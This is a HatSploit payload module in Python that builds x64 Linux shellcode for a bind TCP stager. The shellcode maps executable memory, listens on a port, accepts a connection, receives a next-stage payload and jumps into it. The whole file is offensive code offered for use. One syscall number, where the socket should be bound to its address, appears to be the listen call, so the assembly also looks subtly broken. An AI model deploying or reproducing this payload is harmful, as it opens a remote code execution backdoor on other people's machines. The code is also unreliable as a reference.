"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux x64 Bind TCP",
            'Payload': "linux/x64/bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive bind TCP connection for Linux "
                "with x64 architecture and reads next phase."
            ),
            'Arch': ARCH_X64,
            'Platform': OS_LINUX,
            'Type': BIND_TCP,
        })

        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
                                      False, advanced=True)
        self.length = IntegerOption('PhaseLength', 4096, "Length of next phase.",
                                    False, advanced=True)

    def run(self):
        assembly = f"""
        start:
            push    0x9
            pop     rax
            xor     rdi, rdi
            push    {hex(self.length.value)}
            pop     rsi
            push    0x7
            pop     rdx
            xor     r9, r9
            push    0x22
            pop     r10
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += f"""
            push    rax

            push    0x29
            pop     rax
            cdq
            push    0x2
            pop     rdi
            push    0x1
            pop     rsi
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += f"""
            xchg    rdi, rax
            push    rdx
            mov dword ptr [rsp], 0x{self.rport.little.hex()}0002
            mov     rsi, rsp
            push    0x10
            pop     rdx
            push    0x32
            pop     rax
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += """
            push 0x32
            pop rax
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += """
            xor rsi, rsi
            push 0x2b
            pop rax
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += f"""
            xchg    rdi, rax
            pop     rcx
            push    0x2d
            pop     rax
            pop     rsi
            push    {hex(self.length.value)}
            pop     rdx
            push    0x100
            pop     r10
            syscall
        """

        if self.reliable.value:
            assembly += """
                test    rax, rax
                js      fail
            """

        assembly += """
            jmp rsi
        """

        if self.reliable.value:
            assembly += """
            fail:
                push    0x3c
                pop     rax
                xor     rdi, rdi
                syscall
            """

        return self.assemble(assembly)
